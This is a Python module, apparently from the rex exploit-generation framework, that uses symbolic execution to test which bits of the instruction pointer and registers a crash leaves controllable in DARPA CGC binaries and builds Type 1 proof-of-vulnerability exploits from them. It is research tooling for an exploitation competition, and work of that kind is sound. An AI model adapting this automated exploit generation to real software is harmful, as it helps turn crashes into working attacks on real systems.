import logging
from rex import Vulnerability
from rex.exploit import CannotExploit
from rex.exploit.cgc import CGCType1CircumstantialExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.circumstantial_set_register")


class CircumstantialSetRegister(Technique):

    name = "circumstantially_set_register"

    applicable_to = ['cgc']

    cgc_registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

    bitmask_threshold = 20

    # this technique should create an exploit which is a type1 pov
    pov_type = 1

    generates_pov = True

    def __init__(self, crash, rop, shellcode):
        super(CircumstantialSetRegister, self).__init__(crash, rop, shellcode)
        self._ip_bitmask = None
        self._ip_bitcnt = None

    def set_register(self, register):
        """
        :param register
        set a register with shellcode on cgc
        """

        # can only exploit ip overwrites
        ct = self.crash.crash_type
        if ct != Vulnerability.IP_OVERWRITE and ct != Vulnerability.PARTIAL_IP_OVERWRITE:
            raise CannotExploit("[%s] cannot control ip" % self.name)

        state = self.crash.state

        if self._ip_bitcnt < CircumstantialSetRegister.bitmask_threshold:
            raise CannotExploit("not enough controlled bits of ip")

        # see if the register value is nearly unconstrained
        reg = getattr(state.regs, register)

        # we need to make sure that the pc and this register don't conflict
        conflict = not state.satisfiable(extra_constraints=(reg != state.regs.pc,))
        if conflict:
            raise CannotExploit("register %s conflicts with pc, pc and register must be equal" % register)

        # get the register's bitmask
        reg_bitmask, reg_bitcnt = self.get_bitmask_for_reg(state, register)

        if reg_bitcnt >= CircumstantialSetRegister.bitmask_threshold:
            l.info("can circumstantially set register %s", register)

            return CGCType1CircumstantialExploit(self.crash, register, reg_bitmask, self._ip_bitmask)
        else:
            raise CannotExploit("register %s's value does not appear to be unconstrained" % register)

    def get_bitmask_for_reg(self, state, register):
        reg = getattr(state.regs, register)

        # filter registers with only one value
        if len(state.se.any_n_int(reg, 2)) == 1:
            return 0, 0

        # test each bit of the register
        unconstrained_bitmask = 0
        unconstrained_bitcnt = 0
        for bit in xrange(reg.size()):
            l.debug("testing symbolic control of bit %d in register %s", bit, register)
            if len(state.se.any_n_int(reg & 1 << bit, 2)) == 2:
                unconstrained_bitcnt += 1
                unconstrained_bitmask |= (1 << bit)
        l.debug("unconstrained bitmask %#x", unconstrained_bitmask)

        # reduce the number of claimed bits
        unconstrained_bitmask = self.reduce_claimed_bitmask(unconstrained_bitmask, unconstrained_bitcnt)
        unconstrained_bitcnt = bin(unconstrained_bitmask).count("1")

        if not self.check_bitmask(state, reg, unconstrained_bitmask):
            raise CannotExploit("computed bitmask does not appear to be valid")

        l.debug("reduced bitmask %#x", unconstrained_bitmask)
        return unconstrained_bitmask, unconstrained_bitcnt

    @staticmethod
    def reduce_claimed_bitmask(bitmask, bitcnt):
        """
        The idea here is there could be constraints such as no "\n" or no null bytes
        So we will try to claim control of a max of 7/8 bits in the bitmask
        :param bitmask: the controlled bitmask
        :param bitcnt: the controlled bitcnt
        :return: the new bitmask
        """

        out_mask = 0

        for byte_index in range(4):
            byte = (bitmask >> 8*byte_index) & 0xff
            # if the byte has all bits set and we have extra bits, unset one bit
            if byte == 0xff and bitcnt > CircumstantialSetRegister.bitmask_threshold:
                bitcnt -= 1
                byte = 0x7f
            out_mask |= (byte << 8*byte_index)

        return out_mask

    @staticmethod
    def check_bitmask(state, ast, bitmask):
        # a quick check with some bit patterns to verify control
        size = ast.size()
        test_val_0 = 0x0
        test_val_1 = (1 << size) - 1
        test_val_2 = int("1010"*16, 2) % (1 << size)
        test_val_3 = int("0101"*16, 2) % (1 << size)
        # chars need to be able to be different
        test_val_4 = int(("1001"*2 + "1010"*2 + "1011"*2 + "1100"*2 + "1101"*2 + "1110"*2 + "1110"*2 + "0001"*2), 2) \
            % (1 << size)
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_0 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_1 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_2 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_3 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_4 & bitmask,)):
            return False
        return True

    def apply(self, **kwargs):

        self._ip_bitmask, self._ip_bitcnt = self.get_bitmask_for_reg(self.crash.state, "ip")

        register_setters = []
        for register in CircumstantialSetRegister.cgc_registers:
            try:
                register_setters.append(self.set_register(register))
            except CannotExploit as e:
                l.warning("could not set register %s circumstantially (%s)", register, e.message)

        return register_setters
